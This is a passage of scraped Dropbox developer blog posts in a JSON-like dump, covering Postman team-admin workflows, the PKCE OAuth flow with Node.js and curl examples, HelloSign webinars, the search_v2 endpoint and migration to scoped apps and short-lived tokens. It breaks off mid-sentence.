Workflows collection in Postman After you import the collection, we recommend you check out the documentation by clicking the ellipsis and selecting “View Documentation”: View Documentation Documentation for the Dropbox Team Admin Workflows collection In order to try it out in your own Dropbox team, you'll need to provide the credentials. In the documentation, you will find instructions on how to get your access token from your Dropbox account and add it to the collection. Each workflow in this collection is a folder and can be executed using Postman's Collection Runner. To run a particular workflow, select the folder and click the “Run” button to invoke Collection Runner: Invoking Postman's Collection Runner When you point Collection Runner to a folder, it executes requests sequentially according to their order in the folder, or you can use scripts to define your flow. Collection Runner for a Team Admin Workflow We use Postman variables to store data in between requests. Postman has several variable scopes available, from local to global. We mostly used collection variables for this collection. It is the least privileged scope that allows us to pass values between requests. Using Postman's Tests scripting engine , you can access these variables. You can also build workflows by jumping to a different request or even doing a conditional loop. This is done using the setNextRequest() method. Let's take a look at a sample script from the collection. Notice how a simple if-else statement can invoke different requests based on the response you get from the Dropbox API endpoint: Script that runs after the Get More Groups request in the Bulk Provision Users and Add to Groups Workflow The scripting language that Postman uses is based on Node.js. We recommend reading Postman’s scripting documentation . We believe that pretty soon you'll be modifying our scripts or creating new ones to fit your needs. The Team Admin Workflows collection is already in use by customers and helping administrators manage their teams. For a more comprehensive look at team administration using the Dropbox Business API, we recommend reading our Dropbox Team Administration Guide . To dig deeper into using the API for sharing in a team context, then we recommend the blog post, Manage Team Sharing in your Dropbox App . Another exciting feature of Postman is the recently launched Public Workspaces . With Public Workspaces, teams can collaborate with external users on their collections. Head over to the Dropbox Public Workspace in Postman to find the Team Admin Workflows and other collections. We intend to explore Postman further by releasing other collections, such as showing common operations with the user API. We hope you take the time to explore what our Postman collections can do. If you have coding skills, you can even create your own workflows or improve the existing ones. Go ahead and fork the collections, make pull requests, and help us make them better. Then head over to our Developer Forum and let us know what you think . We look forward to hearing your opinion! // Tags Developers collection Workflow Tips and Tricks Teams // Copy link Link copied Link copied", "date": "2021-01-05"},
{"website": "Dropbox", "title": "PKCE: What and Why?", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/pkce--what-and-why-", "abstract": "PKCE Builds on OAuth 2.0 for Added Security Understanding PKCE Implementation Testing the PKCE Flow Replacing Implicit Flow with PKCE Flow You overhear a conversation between engineers and hear them mention “pixy”. No, they’re not discussing fairies. They’re referring to a new, more secure OAuth flow called PKCE , or Proof Key for Code Exchange. And while no magic is involved in this process, PKCE does provide some great security benefits for your apps, especially if your app runs on a public client. PKCE provides dynamic client secrets, meaning your app’s client secrets can stay secret (even without a back end for your app). PKCE is better and more secure than the implicit flow (AKA the “token flow”). If you’re using the implicit flow, then you should switch to PKCE. If you use an implicit flow to authorize your Dropbox app, then PKCE is a better, more secure replacement, and you should no longer use implicit flow. In this post, we’ll look at how PKCE works, why it’s important, and how you can start using PKCE flows in your Dropbox apps today. PKCE Builds on OAuth 2.0 for Added Security PKCE is a new, more secure authorization flow (based on the OAuth 2.0 spec) that was originally created to better secure mobile apps, but is valuable across all OAuth clients. From the official OAuth 2.0 spec for PKCE : “PKCE ( RFC 7636 ) is an extension to the Authorization Code flow to prevent several attacks and to be able to securely perform the OAuth exchange from public clients.” The OAuth 2.0 spec is the industry standard protocol for authorization and allows users to grant permission for apps to access their Dropbox data. Using OAuth 2.0, users can access their Dropbox data from third party applications without sensitive information (like passwords) ever changing hands. For a more thorough breakdown of how Dropbox implements OAuth 2.0, check out our OAuth Guide . For the purposes of this post, use the diagram below to get a feel for the general authorization flow. Basic authorization flow from a User's POV There are a two major actions taking place here: The user is authorizing an app to access their Dropbox data Dropbox issues an access token to the app that can be used to access the user’s Dropbox data Thee most common and secure OAuth flow is the authorization code flow . Unfortunately, that process relies on apps providing a client_secret in the final request for an access token. For certain types of apps, that makes leaking the secret an inherent, unavoidable risk, which is why they instead needed to rely on an implicit flow . These apps include, but are not limited to mobile apps, single-page apps (SPA) in JavaScript, and serverless apps. Because these are public clients, there’s no way for them to guarantee the security of the secret used for the token exchange. Using the implicit flow solves for that, but with the added risk of exposing the access token in the redirect URI at the end of the authorization flow, which makes the flow vulnerable to different types of network and malicious app interceptions. This tradeoff was acceptable (and necessary) back when apps couldn’t make cross-domain requests—making it impossible to complete an authorization code flow. However, now that CORS is widely supported, there’s no need for that historical compromise; apps can make direct post requests to the token endpoint. Without the cross-origin problem, public clients can take advantage of the authorization code flow by using PKCE, which works by substituting the static client secret with a string that is dynamically generated . By doing so, the PKCE flow eliminates leaky secrets while allowing the authorization server to verify that the app requesting the access token is the same one that initiated the OAuth flow. Let’s take a look at how PKCE makes that possible. Understanding PKCE Implementation Building on top of the authorization code flow , there are three new parameters used by PKCE : code_verifier , code_challenge , and code_challenge_method . Let’s define them before adding more context around the overall flow. The code_verifier is a cryptographically random string generated by your app. This dynamically created string is used to correlate the final access token request with the initial authorization request. In other words, the code_verifier is how the Dropbox authorization server ensures that the access token is issued to the same app that requested authorization. The code_challenge is derived from the code_verifier using one of the two possible transformations: plain and S256. Plain can only be used when S256 is not possible. For the majority of use cases, the code_challenge will be a base 64 encoding of an SHA256 hash made with the client_verifier . This string gets decrypted server-side and is used to verify that the requests are coming from the same client. The code_challenge_method tells the server which function was used to transform the code_verifier (plain or S256). It will default to plain if left empty. These new parameters are used to supplement the authorization code flow to create a powerful system of checks that allow the server to verify that the authorization request and token request both come from the same client. When a user kicks off a PKCE authorization flow in your app, here’s what takes place: Client (your app) creates the code_verifier . ( RFC 7636, Section 4.1 ) Client creates the code_challenge by transforming the code_verifier using S256 encryption. ( RFC 7636, Section 4.2 ) Client sends the code_challenge and code_challenge_method with the initial authorization request. ( RFC 7636, Section 4.3 ) Server responds with an authorization_code . ( RFC 7636, Section 4.4 ) Client sends authorization_code and code_verifier to the token endpoint. ( RFC 7636, Section 4.5 ) Server transforms the code_verifier using the code_challenge_method from the initial authorization request and checks the result against the code_challenge . If the value of both strings match, then the server has verified that the requests came from the same client and will issue an access_token . ( RFC 7636, Section 4.6 ) Now that we understand the flow, let’s see what it looks like in practice. Testing the PKCE Flow In these samples, we’re using Node.js to generate the dynamic strings and curl to send our requests to the Dropbox API. In production, the string generation and API requests would happen in the same app. You’ll need a Dropbox app to follow along . Start by creating a new JavaScript file and importing the crypto module (already bundled with Node), which we’ll use for the SHA-256 encryption: const crypto = require(\"crypto\") Step 1: Client creates code_verifier and subsequent code_challenge Add the following snippet to your JavaScript file Copy const base64Encode = (str) => {\r\n    return str.toString('base64')\r\n        .replace(/\\+/g, '-')\r\n        .replace(/\\//g, '_')\r\n        .replace(/=/g, '');\r\n}\r\nconst codeVerifier = base64Encode(crypto.randomBytes(32));\r\nconsole.log(`Client generated code_verifier: ${codeVerifier}`)\r\n\r\nconst sha256 = (buffer) => {\r\n    return crypto.createHash('sha256').update(buffer).digest();\r\n}\r\nconst codeChallenge = base64Encode(sha256(codeVerifier));\r\nconsole.log(`Client generated code_challenge: ${codeChallenge}`) Run the script with node <your_filename> The console will output the generated strings Client generated code_verifier: kiNgBo0-r4GdQld6ShdPoxGq9SheI2m5moxtX-tFce4 Client generated code_challenge: lSEB3zK2TM-X38Baht80CvC4E_a5DnpCG52y5a7dQyk Step 2: Client sends code_challenge and code_challenge_method to /oauth2/authorize Manually assemble the authorization URL and replace the variables with your own information https://www.dropbox.com/oauth2/authorize?client_id=<APP_KEY>&response_type=code&code_challenge=<CHALLENGE>&code_challenge_method=<METHOD> (mine looks like this) https://www.dropbox.com/oauth2/authorize?client_id=owdjktek8mg5ren&response_type=code&code_challenge=lSEB3zK2TM-X38Baht80CvC4E_a5DnpCG52y5a7dQyk&code_challenge_method=S256 Navigate to the authorization URL and click 'Allow' User consent page for Dropbox OAuth flow Step 3: Server responds with authorization code Copy the authorization code shown after approving the app Authorization code provided after user allows app connection Note: in production, the authorization code is usually sent to a redirect_uri passed with the authorization request, but that optional parameter is left out of this example Step 4: Client sends authorization_code and code_verifier to /oauth2/token Manually assemble the CURL request and replace the variables with your information curl https://api.dropbox.com/oauth2/token \\ -d code=<AUTHORIZATION_CODE> \\ -d grant_type=authorization_code \\ -d code_verifier=<CODE_VERIFIER> \\ -d client_id=<APP_KEY> (my request looks like this) curl https://api.dropbox.com/oauth2/token \\ -d code=xl-pHsaK7hAAAAAAAAAAyLI4TKnv3IAInX9TvlVu76l \\ -d grant_type=authorization_code \\ -d code_verifier=kiNgBo0-r4GdQld6ShdPoxGq9SheI2m5moxtX-tFce4 \\ -d client_id=owdjktek8mg5ren Send request to Dropbox token endpoint ( /oauth2/token ) Server encrypts and compares code_verifier with code_challenge to verify source of authorization and token requests match Server issues an access token: Copy {\r\n  \"access_token\": \"NW7lYmEWHgUAAAAAAAAAAbeutI8iL5CuBik9_CPD5r83XvcQPt-7O5diOdUUcsuX\",\r\n  \"expires_in\": 14399, \r\n  \"token_type\": \"bearer\", \r\n  \"uid\": \"2589992144\", \r\n  \"account_id\": \"dbid:AABuXdtqD88UpveXxu7rcVSo64ADcrWnBMk\", \r\n  \"scope\": \"account_info.read contacts.write file_requests.read file_requests.write files.content.read files.content.write files.metadata.read files.metadata.write\"\r\n} Step 5 : Do a victory dance. You made it! Optionally, you can test your new access token and do another victory dance. curl -X POST https://api.dropboxapi.com/2/users/get_current_account \\ --header \"Authorization: Bearer <Your_Access_Token>\" Replacing Implicit Flow with PKCE Flow Thanks to a clever design, some string manipulation, and a couple extra parameters added to your request, apps that are public clients (mobile, SPAs, serverless, etc.) can take advantage of the enhanced security offered by the authorization code flow by using PKCE . If your app can’t guarantee the security of your client secret, then you should be using PKCE! Using a PKCE flow is (another) great reason to build with our official Dropbox SDKs , where PKCE is already built in. Due to the better design and overall security, we strongly recommend replacing your legacy implicit flows with PKCE. Not sure which authorization flow is best suited for your needs? Check out our OAuth Guide for more detailed information. As always, we’re available to help! You can post your questions on our developer forum or submit a ticket for more direct support. Build with Dropbox today at www.dropbox.com/developers . // Tags Developers OAuth flow Authorization Security Tips and Tricks Oauth // Copy link Link copied Link copied", "date": "2020-12-04"},
{"website": "Dropbox", "title": "HelloSign API Webinar for the UK, Germany, and France ", "author": ["Rebecca Roberts"], "link": "https://dropbox.tech/developers/hellosign-api-webinar-for-the-uk--germany--and-france-", "abstract": "HelloSign API Webinars Webinar Details by Country About HelloSign Register for the HelloSign Webinar Built by developers, for developers, the HelloSign AP I is one of the fastest and easiest ways to build eSignature functionality into your application. Ranked by G2 Crowd as one of the easiest to implement, the HelloSign API has an average integration time of just 2.5 days HelloSign API Webinars We’re organizing a series of educational webinars about the HelloSign API in the UK, Germany, and France! In each respective country, we’re hosting two webinars: Generating Business Value and Measuring ROI with eSignature Technology Want to learn about eSignature technology? This informational session is meant to help decision makers understand how to drive value through eSignatures and how to leverage the HelloSign API as part of your digital strategy. A Deep Dive into the HelloSign API This technical session jumps right into implementation with a live demo of the HelloSign API (including white-labeling). Can’t make the event? No problem. Go ahead and register and we’ll send you the webinar recording. Webinar Details by Country 🇬🇧 United Kingdom 🇬🇧 Topic Description Date & Time Registration link Generating Business Value and Measuring ROI with eSignature Technology Find out how the HelloSign API has helped The Growth Company streamline the loan signature process, reduce operating costs, and increase turnaround times—from weeks to minutes. Wednesday, November 11th, 2:00pm BST Length: 30 minutes https://go.dropbox.com/en-gb/hellosign-api-webinar1 A Deep Dive into the HelloSign API To watch a demonstration of how the HelloSign API is implemented and white labeled in just days, sign up to the webinar. Thursday, November 19th, 2:00pm BST Length: 30 minutes https://go.dropbox.com/en-gb/hellosign-api-webinar2 🇩🇪 Germany 🇩🇪 Topic Description Date & Time Registration link ROI steigern mit elektronischer Signatur Find out how Exporo , Germany's leading provider of digital real estate investments, streamlined their agreement and contract process by using the HelloSign API to move from paper-based to automated workflows. Thursday, November 5th, 9:30am CET Length: 30 minutes https://go.dropbox.com/de-de/hellosign-api-webinar1 e-Signature Technologie - So einfach gehts! To watch a demonstration of how the HelloSign API is implemented and white labeled in just days, sign up to the webinar. Wednesday, November 18th, 10:00am CET Length: 30 minutes https://www.ip-insider.de/e-signature-technologie-so-einfach-gehts-w-43665/?cmp=lkk-mp-wb-lead-dropbox1811-20201104 🇫🇷 France 🇫🇷 Topic Description Date & Time Registration link Passez de 3 semaines à 3 heures avec la signature électronique Find out how Unique Heritage Media , a media and publishing company, simplified and secured their contract signing process by integrating the HelloSign into their existing tech stack —with a minimal investment of development resources. Wednesday November 18th, 11:00am CET Length: 30 minutes https://www.frenchweb.fr/webinar-roi-signature-electronique/407500 Découvrez HelloSign API To watch a demonstration of how the HelloSign API is implemented and white labeled in just days, sign up to the webinar. Tuesday, December 1st 11:00am CET Length: 30 minutes https://go.dropbox.com/fr-fr/hellosign-api-webinar2 About HelloSign As an API-first company, HelloSign invests heavily in building, maintaining, and supporting our API. The HelloSign API Dashboard makes debugging easy, allowing you to track your API requests and responses, view the status of your signature requests, and inspect your callbacks for easy troubleshooting and debugging. And if you do need additional support, our API support engineers are all software developers that can answer technical questions on the spot. The HelloSign API also offers full white labeling , which allows you to customize the logo, color scheme, and legal text of the signer page. This allows HelloSign to blend seamlessly into an app or website for a smoother, consistent signing experience. With white labeling, you get all the awesome functionality we’ve built over the years and your users will think you’ve created it all from scratch! Register for the HelloSign Webinar If you’re interested in hearing from our HelloSign teams in the UK, Germany, or France, then don’t miss this unique opportunity to learn about eSignature technology and the HelloSign API directly from an expert. Please sign up for one of the webinars above! You’ll also hear from companies in your country that are using the HelloSign API to create value. If you have questions or need help building with the HelloSign API, then please use the HelloSign API FAQ s or get help directly from a support engineer by submitting a ticket . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Announcements webinar eSignature HelloSign Events // Copy link Link copied Link copied", "date": "2020-11-04"},
{"website": "Dropbox", "title": "Sample: Embedded Requesting Workflows Using the HelloSign and Dropbox APIs", "author": ["Ruben Rincon"], "link": "https://dropbox.tech/developers/sample--embedded-requesting-workflows-using-the-hellosign-and-dr", "abstract": "In early 2019, Dropbox acquired HelloSign , a company that offers an eSignature API by developers, for developers. Now, in addition to the best-of-breed storage and collaboration provided by the Dropbox API, developers have the ability to generate signed, legally binding documents. Combining these two APIs is quite a powerful tool for developers to have in their toolbox. We’re releasing a new sample that combines the functionality of the HelloSign API and Dropbox API into a single, cohesive app. The code is available in the HelloSign Developer Samples GitHub repo. In the sample app, you can select a file from your Dropbox account, preview it, prepare it, and send the file for signature without ever leaving the web page. Once all signatures are completed, HelloSign will notify the server and the signed document will be automatically be saved back to Dropbox in the same folder as the original file. Some of the technology making this sample possible: The Chooser is a pre-built component which allows users to select their files in Dropbox The Embedder is a pre-built component that allows users to embed Dropbox content on non-Dropbox surfaces The hellosign-embedded library allows users to prepare and send their documents for signature without leaving the web page The Dropbox JavaScript SDK and the HelloSign NodeJS SDK interact with their respective APIs We’re here to help if you have any feedback or questions. You’re always welcome to join the discussion on our community forum . Build with Dropbox today at www.dropbox.com/developers // Tags Developers Node.js Components Sample Apps Tips and Tricks eSignature HelloSign javascript-sdk // Copy link Link copied Link copied", "date": "2020-10-28"},
{"website": "Dropbox", "title": "Search Files Using the Dropbox API", "author": ["Yi Jiang"], "link": "https://dropbox.tech/developers/search-files-using-the-dropbox-api", "abstract": "New Search Features Samples: Using the New Search File organization can be tough, especially as the number of stored files gets bigger. Thankfully, the Dropbox API has a robust, configurable search endpoint that allows you to quickly get to the files you need. Last summer, Dropbox released an updated search endpoint. The new /files/search_v2 endpoint has a wide range of useful features that make it more useful than older v1 version. In this blog post, we’ll cover some of the cool stuff you can do with these new search features. We’ll be retiring the old v1 search on October 28th, 2021. If you haven’t already, please migrate to the search v2 endpoint at your earliest convenience. New Search Features Improved performance and reliability The new version of search has over 20% performance improvement compared to v1. Additionally, the reliability of search v2 is improved compared to v1 and /files/search_v2 is being consumed internally for our own surfaces. Moving from v1 to v2 search will have a positive impact on your app performance! Comparison of performance between /search and /search_v2 Search across more file types The /files/search_v2 endpoint returns more file types that are supported by Dropbox. That includes Paper files, “online-only” files like G Suite or O365, and unmounted files. Unmounted files are files that have been shared with the API caller but are not “mounted” to their Dropbox. You can read more about mounting and unmounting behavior in our Sharing Guide . Filter results by file extension Only care about a certain type of file? Use search options to restrict your search to specific file extensions. If you use the file_extensions parameter to define a list of extensions (i.e. [\"pdf\", \"xlsx\", \"mp3\"] ), then only files that match those extensions will be returned. Restrict search to specific file categories Using the search options , you can specify a list of file_categories such as [\"spreadsheet\", \"presentation\"] . Now your search results will only include file types in the specified categories. Order results results by last modified time By default, search results are sorted based on relevance. However, search v2 offers new functionality that allows you to sort results based on the last time a file was modified. You can turn this on by setting order_by to last_modified_time in your search options. Improved pagination scheme The /files/search/continue_v2 endpoint uses a cursor returned by /files/search_v2 so you can paginate between results. You can test the pagination behavior by limiting your number of results with max_results : Copy curl -X POST 'https://api.dropboxapi.com/2/files/search_v2' \\\r\n--header 'Content-Type: application/json' \\\r\n--header 'Authorization: Bearer <YOUR_ACCESS_TOKEN>' \\\r\n--data '{\r\n    \"query\": \"cats\",\r\n    \"options\": {\r\n        \"max_results\":1\r\n    }\r\n}' Now you can use the returned cursor to get the next page of search results. Copy curl -X POST https://api.dropboxapi.com/2/files/search/continue_v2 \\\r\n    --header \"Authorization: Bearer <YOUR_ACCESS_TOKEN>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data \"{\\\"cursor\\\": \\\"ZtkX9_EHj3x7PMkVuFIhwKYXEpwpLwyxp9vMKomUhllil9q7eWiAu\\\"}\" Include filename highlights in the search results When using the Dropbox user interface to search for a file, the results highlight exact matches for the search string. Search results for “cats” in the Dropbox user interface When calling /files/search_v2, use the include_highlights Boolean to optionally return the highlighted spans with search results: Copy {\r\n    \"has_more\": false,\r\n    \"matches\": [\r\n        {\r\n            \"highlight_spans\": [\r\n                {\r\n                    \"highlight_str\": \"Not \",\r\n                    \"is_highlighted\": false\r\n                },\r\n                {\r\n                    \"highlight_str\": \"cats\",\r\n                    \"is_highlighted\": true\r\n                }\r\n            ],\r\n            \"metadata\": {\r\n                \".tag\": \"metadata\",\r\n                \"metadata\": {\r\n                    \".tag\": \"folder\",\r\n                    \"id\": \"id:7AObMBUU53AAAAAAAAAAbw\",\r\n                    \"name\": \"Bad cats\",\r\n                    \"path_display\": \"/Tokyo Ichiban/Not cats\",\r\n                    \"path_lower\": \"/tokyo ichiban/not cats\",\r\n                    \"property_groups\": []\r\n                }\r\n            }\r\n        },\r\n    ...\r\n    ]\r\n} Samples: Using the New Search Search by file category: Imagine you’re trying to find your financial projections for next year, but you’re not sure of the exact file name or where to find it. You can search files in specific file categories for more control over the search matches. One approach would be searching all spreadsheets for a file with the word “forecast” in the name. Request sample: Copy curl -X POST https://api.dropboxapi.com/2/files/search_v2 \\\r\n    --header \"Authorization: Bearer <YOUR_ACCESS_TOKEN>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data '{\"query\":\"forecast\", \"options\":{\"file_categories\":[\"spreadsheet\"]}}' Response sample: Copy {\r\n   \"has_more\":false,\r\n   \"matches\":[\r\n      {\r\n         \"metadata\":{\r\n            \".tag\":\"metadata\",\r\n            \"metadata\":{\r\n               \".tag\":\"file\",\r\n               \"name\":\"test.xlsx\",\r\n               \"path_display\":\"/Finance/Financial_Forecast_2020.xlsx\",\r\n               \"path_lower\":\"/finance/financial_forecast_2020.xlsx\",\r\n               \"client_modified\":\"2020-09-29T00:32:28Z\",\r\n               \"content_hash\":\"e7b8bc84143e3b3b2e11e0f8249a8e7d8164d729a355f16cda3d2ce097f3f6c9\",\r\n               \"has_explicit_shared_members\":false,\r\n               \"id\":\"id:AxJ4LfEkRbAAAAAAAAADHw\",\r\n               \"is_downloadable\":true,\r\n               \"rev\":\"015b068eb0fd51b000000011d5cd060\",\r\n               \"server_modified\":\"2020-09-29T00:32:30Z\",\r\n               \"sharing_info\":{\r\n                  \"modified_by\":\"dbid:AAD6Wt3CKJD3BQJ03sdip12NDyvpqIPxlfU\",\r\n                  \"parent_shared_folder_id\":\"4787589216\",\r\n                  \"read_only\":false\r\n               },\r\n               \"size\":8162\r\n            }\r\n         }\r\n      },\r\n     ...\r\n   ]\r\n} Search by file extension Imagine you’re trying to find photos of whiteboarding sessions in your Dropbox files. Your team has a new whiteboarding session each month, but there isn’t a formal process  around who takes the photo or where it goes. A good way to find them would be by limiting your search to specific file extensions and ordering by last modification time. Request sample: Copy curl -X POST https://api.dropboxapi.com/2/files/search_v2 \\\r\n    --header \"Authorization: Bearer <YOUR_ACCESS_TOKEN>\" \\\r\n    --header \"Content-Type: application/json\" \\\r\n    --data '{\r\n      \"query\":\"whiteboard\", \r\n      \"options\": {\r\n        \"file_extensions\": [\"jpg\", \"jpeg\", \"png\"],\r\n        \"order_by\": \"last_modified_time\"\r\n      },\r\n      \"match_field_options\": {\r\n        \"include_highlights\": true\r\n      }\r\n    }' Response sample: Copy {\r\n    \"has_more\": false,\r\n    \"matches\": [\r\n        {\r\n            \"highlight_spans\": [\r\n                {\r\n                    \"highlight_str\": \"Nov_2020_\",\r\n                    \"is_highlighted\": false\r\n                },\r\n                {\r\n                    \"highlight_str\": \"whiteboard\",\r\n                    \"is_highlighted\": true\r\n                },\r\n                {\r\n                    \"highlight_str\": \"ing\",\r\n                    \"is_highlighted\": false\r\n                }\r\n            ],\r\n            \"metadata\": {\r\n                \".tag\": \"metadata\",\r\n                \"metadata\": {\r\n                    \".tag\": \"file\",\r\n                    \"client_modified\": \"2020-10-12T23:41:35Z\",\r\n                    \"content_hash\": \"404b4b648afe28177cbb9bf18e1fdb694d306095c81edb8d9a7be360df2303c6\",\r\n                    \"has_explicit_shared_members\": false,  \r\n                    \"id\": \"id:7AObMBEU53AAAAAAAAAbw\",\r\n                    \"is_downloadable\": true,\r\n                    \"name\": \"Nov_2020_whiteboarding.jpg\",\r\n                    \"path_display\": \"/Brainstorming/Nov_2020_whiteboarding.jpg\",\r\n                    \"path_lower\": \"/brainstorming/nov_2020_whiteboarding.jpg\",\r\n                    \"property_groups\": [],\r\n                    \"rev\": \"015b181d6c47362000000017daa20d0\",\r\n                    \"server_modified\": \"2020-10-12T23:41:35Z\",\r\n                    \"sharing_info\": {\r\n                        \"modified_by\": \"dbid:AABuXdtqA88UpveXxu7rcTSo64ADcrWnBMk\",\r\n                        \"parent_shared_folder_id\": \"6403268816\",\r\n                        \"read_only\": false\r\n                    },\r\n                    \"size\": 65353\r\n                }\r\n            }\r\n        },\r\n        {\r\n            \"highlight_spans\": [\r\n                {\r\n                    \"highlight_str\": \"Whiteboard\",\r\n                    \"is_highlighted\": true\r\n                },\r\n                {\r\n                    \"highlight_str\": \"ing \",\r\n                    \"is_highlighted\": false\r\n                },\r\n                {\r\n                    \"highlight_str\": \"Oct2020\",\r\n                    \"is_highlighted\": false\r\n                }\r\n            ],\r\n            \"metadata\": {\r\n                \".tag\": \"metadata\",\r\n                \"metadata\": {\r\n                    \".tag\": \"file\",\r\n                    \"client_modified\": \"2020-03-04T20:54:47Z\",\r\n                    \"content_hash\": \"bc8f3f67578f1a9926c0bd0f93f4068ea74745af079e4837ca3ae53d253f1b9f\",\r\n                    \"has_explicit_shared_members\": false,\r\n                    \"id\": \"id:7AObMBEU53AAAAAAAAAbw\",\r\n                    \"is_downloadable\": true,\r\n                    \"name\": \"Whiteboarding Oct2020.png\",\r\n                    \"path_display\": \"/Q4_ideas/Whiteboarding Oct2020.png\",\r\n                    \"path_lower\": \"/q4_ideas/whiteboarding oct2020.png\",\r\n                    \"property_groups\": [],\r\n                    \"rev\": \"015a00da174f18d000000017daa20d0\",\r\n                    \"server_modified\": \"2020-03-04T20:54:47Z\",\r\n                    \"sharing_info\": {\r\n                        \"modified_by\": \"dbid:AABuXdtqA88UpveXxu7rcTSo64ADcrWnBMk\",\r\n                        \"parent_shared_folder_id\": \"6403268816\",\r\n                        \"read_only\": false\r\n                    },\r\n                    \"size\": 116317\r\n                }\r\n            }\r\n        }\r\n    ...\r\n    ]\r\n} Migrating to the new search The /files/search_v2 endpoint offers some powerful new features to help you more easily grab what you need from Dropbox. In addition to better performance, the new search endpoint includes more supported file types in the results, allows you to filter by extension or category, and adds other features like pagination and highlighting. We’ll be retiring search v1 on Feb 28th, 2021 so we recommend migrating if your app depends on search functionality. As always, we’re available to help! You can post your questions on our developer forum or submit a ticket for more direct support. Build with Dropbox today at www.dropbox.com/developers . // Tags Developers Announcements Tips and Tricks Search // Copy link Link copied Link copied", "date": "2020-10-15"},
{"website": "Dropbox", "title": "Building with Dropbox Webinar", "author": ["Marcel Ribas"], "link": "https://dropbox.tech/developers/building-with-dropbox-webinar", "abstract": "If you’re new to the Dropbox API or need a refresher, join us on October 28th at 11 AM CDT (9 PDT, 10 MDT, or 12 EDT) for a webinar to help you get started. This webinar is open to all, but is designed for builders getting started on the platform. To join the event, please register here . In this hour long virtual session, you’ll get the opportunity to meet some of the Dropbox Developer Evangelists, learn about the tools available to developers, see how to start building your first application, and ask questions live. We hope to see you there! Are there other topics you’d like to see covered in live webinars? Please post your ideas in the forum thread, Discussion: Building with Dropbox Webinar . // Tags Developers webinar Announcements Events // Copy link Link copied Link copied", "date": "2020-10-06"},
{"website": "Dropbox", "title": "Migrating App Permissions and Access Tokens", "author": ["Taylor Krusen"], "link": "https://dropbox.tech/developers/migrating-app-permissions-and-access-tokens", "abstract": "Introducing Scoped Apps Updating Permissions Updating Access Token Type Retiring Legacy Tokens Getting Help Introducing Scoped Apps We recently launched several permissions enhancements. You can read about them in the OAuth Guide or in the blog post, Now Available: Scoped Apps and Enhanced Permissions . The major changes to be aware of are the introduction of short-lived tokens, scopes, PKCE, and refresh tokens. For now, our App Console supports both legacy and scoped app creation, but may be turned off soon as we prepare to retire long-lived tokens on September 30th, 2021. This means that: You should review your apps permission tab to transition to scopes. (This does not require code changes). You should ensure your app works with short-lived access tokens. (This may require code changes). Updating Permissions When you go the Permissions tab in an app’s settings, the scopes will be pre-selected based on your app’s legacy access type. For example, apps using the Business API with Team auditing will have team_info.read, members.read, groups.read, and events.read already selected. Apps using the User API will have all user scopes pre-selected. You can click through without making changes and your app will continue working. However, we strongly recommend deselecting the scopes your app doesn’t need, which results in better overall security and asking for less permissions from your users. Determine required scopes Make a list of endpoints used by your app. Look at each endpoint in the HTTP Reference documentation and record the “Required Scope”. Required scope for an endpoint in the API docs For example, pretend we’re migrating an app for an online photo editing tool. For each endpoint used by the app we're going to record the corresponding scope. Endpoint Required Scope /users/get_current_account account_info.read /files/list_folder (and /continue ) files.metadata.read /files/get_thumbnail files.content.read /files/download files.content.read /files/upload files.content.write If you ensure that your app’s scopes match your list, then your app will have the exact permissions it needs to access those endpoints. API calls to an endpoint without the appropriate scopes will throw an error. Programmatically set scopes After migrating, you can test your app with a specific group of scopes by passing them in the authorization URL. This approach can be used to test groups of scopes before deselecting the ones that aren’t needed. https://www.dropbox.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT_URI&response_type=code& scope=files.content.read&account_info.read Migrate permissions to scopes Inside the App Console , go to the Settings page of app using the legacy permission model and click the Permissions tab. Note the message in light blue with details about the migration process. Deselect the scopes that your app is not using. Exercise caution when deselecting scopes as you can break functionality that your app depends on. We recommend auditing your app for required scopes before deselecting the ones you don’t need.  Additional scopes can be added or removed later as needed. Permissions tab of a Dropbox app's settings page Click Migrate then Confirm . Note that this change does not impact existing tokens. Test your scopes by going through an authorization flow. Way to go—you’ve migrated your app to use scopes! Next, we recommend migrating to short-lived tokens as long-lived tokens will be deprecated in the future. Updating Access Token Type If your app handles errors with 401 status correctly and only calls the Dropbox API when users are interacting with it, then it shouldn’t need any code changes. If your app doesn’t properly handle 401 errors or needs to interact with the Dropbox API without user input (“offline” access), then it may require code changes. Testing short-lived access tokens with token_access_type Before migrating your app to short-lived tokens, we recommend testing them in your app. You can programmatically issue short-lived tokens with a small adjustment to your code—including token_access_type=online in your authorization URL. https://www.dropbox.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT_URI&response_type=code& token_access_type=online We recommend starting with this approach during migration, then, once you’re confident in your app’s behavior, update the default access token type to short-lived in the App Console . You can find more information about setting up the right authorization flow for your app in the OAuth Guide . Handle authorization errors When a user tries to access your app with an invalid token, redirect them to the authorization URL you use in your OAuth flow. If the user has already authorized the app (and is logged into Dropbox), then a new short-lived is issued and they’re redirected to your app without any input from the user. This process will result in more re-authorization flows than before, but will have minimal impact on the end user experience. If your app only calls the Dropbox API when the user is actively interacting with the app ( online access) and follows the OAuth best practice of prompting for re-authentication on a 401 error, then your app should not not require code changes to support short live tokens. Implement refresh tokens For apps that: Want long-term access regardless of whether a user is present (i.e. a mobile app that stays logged in) Want to interact with the Dropbox API when a user isn’t actively interacting with the app (“offline” access) We offer a long-lived refresh_token that can be used to request a new, short-lived access token. Request a refresh_token as part of your access token payload by declaring the token access type as offline ( token_access_type=offline ) as a parameter in your authorization URL: https://www.dropbox.com/oauth2/authorize?client_id=YOUR_CLIENT_ID&redirect_uri=YOUR_REDIRECT_URI&response_type=code& token_access_type=offline Now, complete your authorization request to /oauth2/token curl https://api.dropbox.com/oauth2/token \\ -d code=<AUTHORIZATION_CODE> \\ -d grant_type=authorization_code \\ -d redirect_uri=<REDIRECT_URI> \\ -u <APP_KEY>:<APP_SECRET> The resulting payload contains a refresh_token : Copy {\r\n    \"uid\": \"267161268\", \r\n    \"access_token\": \"Your_Access_token\", \r\n    \"expires_in\": 14399, \r\n    \"token_type\": \"bearer\", \r\n    \"scope\": \"files.content.read files.metadata.read sharing.read sharing.write\", \r\n    \"refresh_token\": \"LwlUmqpmGqgAAAAAAAAEYgRoVJoei4u9cC7cDHFBAp0Kkp2JNciPxQpNWGY\", \r\n    \"account_id\": \"dbid:AABuTtSGJM0ME3t4m85i1o3XqnmXvwH5I-A\"\r\n} Now, when you request a new token from the /oauth2/token endpoint, 